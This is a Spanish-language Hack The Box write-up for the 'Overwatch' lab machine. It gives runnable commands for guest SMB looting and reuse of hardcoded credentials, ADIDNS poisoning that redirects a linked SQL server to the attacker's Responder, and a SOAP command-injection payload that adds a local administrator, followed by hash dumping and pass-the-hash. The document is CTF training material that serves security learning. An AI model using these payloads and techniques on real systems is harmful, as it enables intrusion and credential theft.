# Overwatch WriteUp — Hack The Box


---

## 1. Descripción general

**Overwatch** es una máquina de dificultad **Medium** de la plataforma Hack The Box.

La ruta de explotación se basa en una cadena de pasos típica de Active Directory:

1. Reconocimiento de puertos y servicios.
2. Acceso como invitado a un recurso compartido SMB.
3. Descarga y análisis de un binario `.NET`.
4. Extracción de credenciales embebidas en el código.
5. Acceso a MSSQL en un puerto no estándar.
6. Enumeración de servidores vinculados en SQL Server.
7. Abuso de resolución DNS integrada en Active Directory, conocida como **ADIDNS poisoning**.
8. Captura de credenciales en texto claro con Responder.
9. Acceso por WinRM como usuario de dominio.
10. Escalada de privilegios mediante un servicio WCF vulnerable a inyección de comandos.
11. Obtención de acceso como administrador.

---

## 2. Cadena de ataque resumida

```text
Reconocimiento
      ↓
Puertos relevantes: 88, 389, 445, 5985, 6520, 8000
      ↓
SMB con usuario guest → recurso software$
      ↓
Descarga de overwatch.exe
      ↓
Decompilación .NET → credenciales sqlsvc
      ↓
Acceso MSSQL por puerto 6520
      ↓
Servidor vinculado SQL07
      ↓
ADIDNS poisoning para redirigir SQL07 hacia la IP atacante
      ↓
Responder captura credenciales sqlmgmt en texto claro
      ↓
Acceso WinRM como sqlmgmt
      ↓
Servicio WCF interno en puerto 8000
      ↓
Inyección de comandos en KillProcess
      ↓
Creación de usuario administrador local / lectura de root.txt
      ↓
Dump de hashes y acceso Administrator por Pass-the-Hash
```

---

## 3. Reconocimiento inicial

### 3.1 Configuración de `/etc/hosts`

Primero se agrega el dominio de la máquina al archivo `/etc/hosts`. Esto permite referenciar la IP objetivo usando el nombre `overwatch.htb`.

```bash
echo "10.129.41.13 overwatch.htb" | sudo tee -a /etc/hosts
```

**Explicación:**

- `10.129.41.13` corresponde a la IP de la máquina en HTB.
- `overwatch.htb` es el nombre que se usará para resolver el host.
- `tee -a` agrega la línea al final del archivo sin sobrescribir su contenido.

---

### 3.2 Escaneo de puertos

Se recomienda hacer el escaneo en dos fases: primero detectar puertos abiertos y luego enumerar versiones/servicios.

#### Fase 1: descubrimiento rápido de puertos TCP

```bash
sudo nmap -p- --open -Pn --min-rate 5000 -oA ports -vvv overwatch.htb
```

**Explicación:**

- `-p-`: escanea todos los puertos TCP.
- `--open`: muestra solo puertos abiertos.
- `-Pn`: evita descubrimiento por ping.
- `--min-rate 5000`: acelera el escaneo enviando paquetes a una tasa mínima.
- `-oA ports`: guarda resultados en varios formatos con nombre base `ports`.
- `-vvv`: aumenta el nivel de detalle en pantalla.

#### Fase 2: detección de versiones y scripts básicos

```bash
grep -oP '\d+/open' ports.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//' > ports.txt
sudo nmap -sCV -p$(cat ports.txt) -Pn -oA scan -vvv overwatch.htb
```

**Explicación:**

El primer comando extrae los puertos abiertos del archivo generado por Nmap. El segundo comando ejecuta detección de versiones y scripts sobre esos puertos.

---

### 3.3 Puertos relevantes encontrados

| Puerto | Servicio | Observación |
|---:|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Servicio típico de Active Directory |
| 135 | RPC | Microsoft RPC |
| 139 | NetBIOS | NetBIOS Session Service |
| 389 | LDAP | Active Directory LDAP |
| 445 | SMB | Recursos compartidos Windows |
| 636 | LDAPS | LDAP sobre TLS |
| 3268 | Global Catalog | Catálogo global de AD |
| 3389 | RDP | Escritorio remoto |
| 5985 | WinRM | Administración remota Windows |
| 6520 | MSSQL | SQL Server en puerto no estándar |
| 8000 | HTTP/WCF | Servicio MonitorService |
| 9389 | AD Web Services | Servicio .NET AD Web Services |

El puerto **6520** es importante porque MSSQL normalmente usa el puerto **1433**. Al estar en un puerto no estándar, podría pasar desapercibido si el escaneo no se completa.

Para confirmar manualmente este puerto:

```bash
sudo nmap -p 6520 -sV overwatch.htb
```

---

## 4. Acceso inicial

### 4.1 Enumeración SMB con usuario invitado

Se prueba si el usuario `guest` puede listar recursos compartidos SMB.

```bash
netexec smb overwatch.htb -u 'guest' -p '' --shares
```

Resultado relevante:

```text
Share       Permissions     Remark
-----       -----------     ------
ADMIN$                      Remote Admin
C$                          Default share
IPC$        READ            Remote IPC
software$   READ            Software Repository
```

**Explicación:**

El recurso compartido `software$` permite lectura usando la cuenta `guest`. Esto representa una mala práctica, porque un usuario no autenticado o de bajo privilegio puede descargar archivos internos.

---

### 4.2 Descarga del recurso compartido

Se descarga el contenido completo del recurso `software$`.

```bash
smbclient //overwatch.htb/software$ -U 'guest%' -c 'prompt OFF; recurse ON; mget *'
```

Archivos descargados relevantes:

```text
Monitoring\overwatch.exe
Monitoring\overwatch.dll
Monitoring\overwatch.runtimeconfig.json
```

**Explicación:**

- `prompt OFF`: evita pedir confirmación por cada archivo.
- `recurse ON`: descarga recursivamente carpetas y subcarpetas.
- `mget *`: descarga todo el contenido.

---

## 5. Análisis del binario .NET

### 5.1 Decompilación con ILSpy

El archivo `overwatch.exe` es un ensamblado `.NET`. Este tipo de binarios suele poder decompilarse con herramientas como ILSpy.

```bash
dotnet tool install ilspycmd -g --version 8.2.0.7535
~/.dotnet/tools/ilspycmd overwatch.exe -o overwatch_src/
```

**Explicación:**

- `ilspycmd` permite convertir un binario `.NET` en código C# legible.
- La opción `-o overwatch_src/` guarda el código decompilado en una carpeta.

---

### 5.2 Hallazgos del código decompilado

En el código decompilado se encuentran dos elementos importantes:

```csharp
[ServiceContract]
public interface IMonitoringService
{
    [OperationContract] string StartMonitoring();
    [OperationContract] string StopMonitoring();
    [OperationContract] string KillProcess(string processName);
}

public class MonitoringService : IMonitoringService
{
    private readonly string connectionString = "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;";

    public string KillProcess(string processName)
    {
        string scriptContents = "Stop-Process -Name " + processName + " -Force";
        // ...executes scriptContents in a PowerShell Runspace and returns the output
    }
}
```

1. Credenciales embebidas para conexión a base de datos.
2. Definición de un servicio WCF con un método llamado `KillProcess`.

Ejemplo conceptual del fragmento vulnerable:

```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```

**Credenciales identificadas:**

```text
Usuario: sqlsvc
Contraseña: TI0LKcfHzZw1Vv
```

**Explicación:**

El problema principal es que el programa concatena directamente el parámetro `processName` dentro de un comando PowerShell. Si un atacante controla ese parámetro, podría inyectar comandos adicionales.

---

## 6. Enumeración LDAP

Con las credenciales obtenidas se realiza enumeración del dominio mediante LDAP.

```bash
ldapsearch -x -H ldap://overwatch.htb \
  -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' \
  -b 'DC=overwatch,DC=htb' '(objectClass=user)' sAMAccountName
```

**Explicación:**

- `-x`: autenticación simple.
- `-H`: servidor LDAP.
- `-D`: usuario con el que se realiza la consulta.
- `-w`: contraseña.
- `-b`: base distinguished name del dominio.
- `(objectClass=user)`: filtro para listar usuarios.
- `sAMAccountName`: atributo solicitado.

Usuarios relevantes encontrados:

```text
sqlsvc
sqlmgmt
```

---

## 7. Acceso a MSSQL

### 7.1 Conexión al servidor SQL

El servicio MSSQL se encuentra en el puerto **6520**, por lo que se debe especificar manualmente.

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.41.13' \
  -port 6520 -windows-auth
```

**Explicación:**

Se usa `impacket-mssqlclient` para autenticarse contra SQL Server usando las credenciales encontradas en el binario.

---

### 7.2 Enumeración de servidores vinculados

Dentro de la consola SQL:

```sql
enum_links
```

Resultado relevante:

```text
SRV_NAME    SRV_PROVIDERNAME    SRV_PRODUCT    SRV_DATASOURCE
--------    ----------------    -----------    --------------
SQL07       SQLNCLI             SQL Server     SQL07
```

**Explicación:**

El servidor SQL tiene configurado un servidor vinculado llamado `SQL07`. Esto significa que el servidor actual puede intentar conectarse a otro SQL Server usando ese nombre.

El punto clave es que `SQL07` se resuelve por nombre. Si se logra manipular esa resolución DNS para que apunte a la máquina atacante, se puede intentar capturar la autenticación.

---

## 8. ADIDNS Poisoning

### 8.1 Concepto

**ADIDNS** significa *Active Directory Integrated DNS*. En muchos entornos Active Directory, los usuarios autenticados pueden crear registros DNS si el nombre aún no existe.

En este caso, se aprovecha que el nombre `SQL07` no está registrado o puede ser agregado. Se crea un registro DNS falso que apunta `SQL07` hacia la IP del atacante.

---

### 8.2 Creación del registro DNS falso

> Reemplaza `10.10.14.100` por tu IP de VPN/tun0 en Hack The Box.

```bash
python3 /usr/share/krbrelayx/dnstool.py \
  -u 'overwatch.htb\sqlsvc' \
  -p 'TI0LKcfHzZw1Vv' \
  -r 'SQL07' \
  -a add \
  -d 10.10.14.100 \
  -dns-ip 10.129.41.13 \
  10.129.41.13
```

Resultado esperado:

```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

**Explicación:**

- `-r SQL07`: nombre DNS que se quiere registrar.
- `-a add`: acción de agregar registro.
- `-d 10.10.14.100`: IP a la que resolverá `SQL07`.
- `-dns-ip 10.129.41.13`: servidor DNS del dominio.

---

## 9. Captura de credenciales con Responder

Se inicia Responder en la interfaz VPN.

```bash
sudo responder -I tun0 -wv
```

Desde la sesión MSSQL se fuerza la conexión al linked server:

```sql
EXEC ('SELECT 1') AT SQL07
```

Resultado relevante en Responder:

```text
[MSSQL] Received connection from 10.129.41.13
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

**Credenciales obtenidas:**

```text
Usuario: sqlmgmt
Contraseña: bIhBbzMMnB82yx
```

**Explicación:**

En este caso no se captura un hash NTLM para crackear. El servidor utiliza autenticación SQL Server y las credenciales llegan en texto claro.

---

## 10. Acceso por WinRM como sqlmgmt

Con las credenciales capturadas se accede por WinRM.

```bash
evil-winrm -i overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

Para leer la flag de usuario:

```cmd
type C:\Users\sqlmgmt\Desktop\user.txt
```

---

## 11. Escalada de privilegios mediante WCF MonitorService

### 11.1 Descubrimiento de servicios locales

Desde la shell de WinRM se revisan puertos en escucha.

```cmd
netstat -an | findstr LISTEN
```

Resultado relevante:

```text
TCP    0.0.0.0:5985    0.0.0.0:0    LISTENING
TCP    0.0.0.0:6520    0.0.0.0:0    LISTENING
TCP    0.0.0.0:8000    0.0.0.0:0    LISTENING
TCP    0.0.0.0:9389    0.0.0.0:0    LISTENING
```

El puerto **8000** corresponde al servicio WCF identificado previamente. Aunque escucha en `0.0.0.0`, el firewall bloquea el acceso externo. Por eso se interactúa localmente desde la propia sesión WinRM usando `127.0.0.1`.

---

### 11.2 Enumeración del WSDL

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService?singleWsdl" -UseBasicParsing | Select-Object -ExpandProperty Content
```

**Explicación:**

El WSDL describe los métodos disponibles del servicio WCF. Se identifican tres métodos:

```text
StartMonitoring
StopMonitoring
KillProcess
```

El método interesante es `KillProcess`, porque recibe un parámetro `processName` que se concatena directamente dentro de un comando PowerShell.

---

## 12. Explotación de la inyección de comandos

### 12.1 Causa de la vulnerabilidad

El servicio construye un comando PowerShell de esta forma:

```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```

Si `processName` contiene un separador de comandos como `;`, PowerShell puede ejecutar instrucciones adicionales.

---

### 12.2 Opción 1: crear un usuario administrador local

```powershell
$soap = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tem="http://tempuri.org/">
  <soap:Body>
    <tem:KillProcess>
      <tem:processName>fake; net user pwn Password123! /add; net localgroup administrators pwn /add #</tem:processName>
    </tem:KillProcess>
  </soap:Body>
</soap:Envelope>
"@

Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService" `
  -Method POST -Body $soap `
  -ContentType "text/xml; charset=utf-8" `
  -UseBasicParsing `
  -Headers @{"SOAPAction"='"http://tempuri.org/IMonitoringService/KillProcess"'}
```

**Explicación:**

- `fake` es un nombre de proceso inexistente.
- `;` separa instrucciones en PowerShell.
- `net user pwn Password123! /add` crea un usuario local.
- `net localgroup administrators pwn /add` agrega el usuario al grupo de administradores.
- `#` comenta el resto del comando, evitando que `-Force` cause error de sintaxis.

---

### 12.3 Opción 2: leer directamente la flag de administrador

```powershell
$soap = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tem="http://tempuri.org/">
  <soap:Body>
    <tem:KillProcess>
      <tem:processName>fake; Get-Content C:\Users\Administrator\Desktop\root.txt #</tem:processName>
    </tem:KillProcess>
  </soap:Body>
</soap:Envelope>
"@

Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService" `
  -Method POST -Body $soap `
  -ContentType "text/xml; charset=utf-8" `
  -UseBasicParsing `
  -Headers @{"SOAPAction"='"http://tempuri.org/IMonitoringService/KillProcess"'}
```

**Explicación:**

En esta opción se aprovecha que el servicio devuelve la salida del pipeline PowerShell en la respuesta SOAP. Por eso el contenido de `root.txt` puede aparecer directamente en la respuesta XML.

---

## 13. Dump de hashes y acceso como Administrator

Si se creó el usuario `pwn`, se pueden extraer hashes desde la máquina atacante.

```bash
impacket-secretsdump 'overwatch.htb/pwn:Password123!@10.129.41.13'
```

Ejemplo de hash obtenido:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:269fa056205bbf5d47fc2c3682dbbce6:::
```

Con el hash NTLM del administrador se accede usando Pass-the-Hash.

```bash
evil-winrm -i overwatch.htb -u Administrator -H '269fa056205bbf5d47fc2c3682dbbce6'
```

Para leer la flag root:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## 14. Resumen técnico

| Fase | Técnica | Herramienta | Resultado |
|---:|---|---|---|
| 1 | Enumeración SMB | `netexec`, `smbclient` | Recurso `software$` accesible |
| 2 | Reverse engineering .NET | `ilspycmd` | Credenciales `sqlsvc` |
| 3 | Acceso MSSQL | `impacket-mssqlclient` | Conexión al puerto 6520 |
| 4 | Linked server | MSSQL | Identificación de `SQL07` |
| 5 | ADIDNS poisoning | `dnstool.py` | Registro DNS falso para `SQL07` |
| 6 | Captura de credenciales | `Responder` | Credenciales `sqlmgmt` en texto claro |
| 7 | Acceso remoto | `evil-winrm` | Shell como `sqlmgmt` |
| 8 | Enumeración local | `netstat`, WSDL | Servicio WCF en puerto 8000 |
| 9 | Explotación WCF | SOAP + PowerShell | Inyección en `KillProcess` |
| 10 | Escalada | `net user`, `secretsdump` | Acceso Administrator |

---

## 15. Lecciones aprendidas

### Desde la perspectiva ofensiva

- Siempre revisar SMB con cuentas de bajo privilegio o invitado.
- Los binarios `.NET` suelen revelar lógica interna y secretos si no están protegidos.
- MSSQL en puertos no estándar puede ser clave en entornos AD.
- Los linked servers pueden abrir rutas laterales inesperadas.
- ADIDNS poisoning permite abusar de resoluciones internas cuando hay permisos débiles.
- Los servicios WCF pueden exponer métodos peligrosos si concatenan entradas de usuario en comandos del sistema.

### Desde la perspectiva defensiva

- No permitir acceso `guest` a recursos SMB internos.
- Evitar credenciales embebidas en aplicaciones.
- Aplicar gestión de secretos y rotación de contraseñas.
- Restringir permisos de creación de registros DNS en zonas integradas con AD.
- Revisar linked servers en SQL Server y su mecanismo de autenticación.
- Validar entradas de usuario antes de construir comandos.
- Evitar ejecución de PowerShell con parámetros concatenados.
- Monitorear autenticaciones anómalas hacia servicios internos.

---

## 16. Comandos principales en orden

```bash
echo "10.129.41.13 overwatch.htb" | sudo tee -a /etc/hosts
```

```bash
sudo nmap -p- --open -Pn --min-rate 5000 -oA ports -vvv overwatch.htb
```

```bash
grep -oP '\d+/open' ports.gnmap | cut -d'/' -f1 | sort -u | tr '\n' ',' | sed 's/,$//' > ports.txt
sudo nmap -sCV -p$(cat ports.txt) -Pn -oA scan -vvv overwatch.htb
```

```bash
netexec smb overwatch.htb -u 'guest' -p '' --shares
```

```bash
smbclient //overwatch.htb/software$ -U 'guest%' -c 'prompt OFF; recurse ON; mget *'
```

```bash
dotnet tool install ilspycmd -g --version 8.2.0.7535
~/.dotnet/tools/ilspycmd overwatch.exe -o overwatch_src/
```

```bash
ldapsearch -x -H ldap://overwatch.htb \
  -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' \
  -b 'DC=overwatch,DC=htb' '(objectClass=user)' sAMAccountName
```

```bash
impacket-mssqlclient 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.41.13' \
  -port 6520 -windows-auth
```

```sql
enum_links
```

```bash
python3 /usr/share/krbrelayx/dnstool.py \
  -u 'overwatch.htb\sqlsvc' \
  -p 'TI0LKcfHzZw1Vv' \
  -r 'SQL07' \
  -a add \
  -d 10.10.14.100 \
  -dns-ip 10.129.41.13 \
  10.129.41.13
```

```bash
sudo responder -I tun0 -wv
```

```sql
EXEC ('SELECT 1') AT SQL07
```

```bash
evil-winrm -i overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'
```

```cmd
type C:\Users\sqlmgmt\Desktop\user.txt
```

```cmd
netstat -an | findstr LISTEN
```

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService?singleWsdl" -UseBasicParsing | Select-Object -ExpandProperty Content
```

```bash
impacket-secretsdump 'overwatch.htb/pwn:Password123!@10.129.41.13'
```

```bash
evil-winrm -i overwatch.htb -u Administrator -H '269fa056205bbf5d47fc2c3682dbbce6'
```

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## 17. Nota ética

Este material debe utilizarse únicamente en laboratorios autorizados como Hack The Box, TryHackMe o entornos propios de práctica. No debe aplicarse sobre sistemas reales sin autorización explícita.

